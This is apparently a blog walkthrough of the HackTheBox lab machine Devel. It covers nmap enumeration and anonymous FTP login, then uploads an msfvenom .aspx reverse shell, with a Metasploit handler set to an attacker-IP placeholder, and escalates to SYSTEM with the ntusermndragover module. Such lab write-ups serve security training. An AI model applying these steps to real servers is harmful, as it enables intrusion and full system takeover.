---
title: "Hackthebox Devel Walkthrough"
description: "Hackthebox Devel Walkthrough"
date: 2025-06-12
categories: [Walkthrough]
tags: [hackthebox,Devel,Walkthrough,windows]
image :
    path : https://api.pcloud.com/getpubthumb?code=XZeArj5Zp7k40papmHVs7B5nYhm9A06cK2vy&linkpassword=&size=598x381&crop=0&type=auto
---

Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

![Image1](https://api.pcloud.com/getpubthumb?code=XZoXcj5ZjraVyBSeYILfBGeUrYrBcY9OSeQX&linkpassword=&size=1563x174&crop=0&type=auto)

- Let's Spawn the machine

![Image2](https://api.pcloud.com/getpubthumb?code=XZVVcj5Zfm5CEUUmSLhSuUqo1oXyFBT1mXVV&linkpassword=&size=1553x203&crop=0&type=auto)

## <span style="color: DarkSalmon;"><b># Enumeration</b></span> 
---------

- Let's Start with the Nmap scan 

```bash
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ nmap -sC -sV -p- 10.10.10.5 --min-rate=1500      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 06:30 EDT
Nmap scan report for 10.10.10.5
Host is up (0.24s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.28 seconds
```

- there nothign much to explore its very straight forward machine ...

`Port 21` : Ftp Service <br>
`Port 80` : Microsoft_IIS server 

- we are able to connect to the ftp server using the anonymous login
`anonymous:anonymous`

![Image3](https://api.pcloud.com/getpubthumb?code=XZ5Vcj5ZFLMgCh6km8H8u2rm1mxmr7iLt2aV&linkpassword=&size=737x265&crop=0&type=auto)

- listing file the files revels that this is the directory for the IIS webserver , means the file we upload through the ftp server can be accessed through IIS server directory through root directory . 

- let's generate `.aspx` reverse shell file  using msfvenom 

![Image4](https://api.pcloud.com/getpubthumb?code=XZHVcj5ZzW3PBnFSIwLYb21nkC59FzaaCRh7&linkpassword=&size=943x142&crop=0&type=auto)

- we can upload this using `put` command through ftp server .

![Image5](https://api.pcloud.com/getpubthumb?code=XZLVcj5ZjwnYGnvOQzX61e4tCCha6f22yeK7&linkpassword=&size=1891x135&crop=0&type=auto)

## <span style="color: DarkSalmon;"><b># Exploitation</b></span> 
--------

- we can set the listner on the metasploit if we want using 

```bash
use /multi/handler
set payload <payload>
set lost <attacker-IP>
set lport <listner port>
run
```

- and we can access our file , which we have upload on the server ... 

![Image6](https://api.pcloud.com/getpubthumb?code=XZ4Vcj5ZJ6moRWoAHbycoc0qEF28uJQXrDW7&linkpassword=&size=558x124&crop=0&type=auto)

- as soon as we visit that file reverse shell will be triggered on our metasploit listner , and we got shell as `IIS APPPOOL\Web` similar to `www-data` on linux... 

![Image7](https://api.pcloud.com/getpubthumb?code=XZQVcj5Za4LaokSFJnJTaFe3MrYWEbtiQyYy&linkpassword=&size=990x136&crop=0&type=auto)

- now we can background the process `( CTRL+Z )` and use the metasploit's `/multi/recon/local_exploit_suggestor` module by setting the session id where we have the meterpreter connection. 

![Image8](https://api.pcloud.com/getpubthumb?code=XZmVcj5Z5582C5rNqsVlyTB4SV6m9HekOHNX&linkpassword=&size=1121x612&crop=0&type=auto)


- as we run this module we will get the probable way to escaalte the privileges .. 

![Image9](https://api.pcloud.com/getpubthumb?code=XZjVcj5ZLzRJTwNB9lYxIsOVJkv6GXJ7S2O7&linkpassword=&size=1174x609&crop=0&type=auto)

- here we will use the `exploit/windows/local/ntusermndragover` module for privilege escalation by setting the session id and run it ... after a little while , we will get the shell as `NT AUTHORITY\SYSTEM`

![Image10](https://api.pcloud.com/getpubthumb?code=XZ2Vcj5ZJkaYHybD5OBItQUugp4Xf8ErMBtk&linkpassword=&size=961x309&crop=0&type=auto)

- now we can grab the `user.txt` file 

![Image11](https://api.pcloud.com/getpubthumb?code=XZDVcj5ZEF86TVA4TF7NTg3IaRcxyuaJuOM7&linkpassword=&size=539x246&crop=0&type=auto)

- similarly we can get the root hash 

```bash
 Directory of C:\Users\Administrator\Desktop

14/01/2021  12:42 ��    <DIR>          .
14/01/2021  12:42 ��    <DIR>          ..
08/06/2025  01:28 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5.027.282.944 bytes free

C:\Users\Administrator\Desktop>type root.txt
```
> we can also go the manual way if we want ... 


<br>
## <span style="color: DarkSalmon;"><b># Final Thoughts</b></span>
--------
I hope this blog continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts — my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on Linkedin and Twitter <br>
[linkdin](https://www.linkedin.com/in/hitesh-sharma-413862245/) <br>
[Twitter](https://x.com/Archtrmntor) <br>









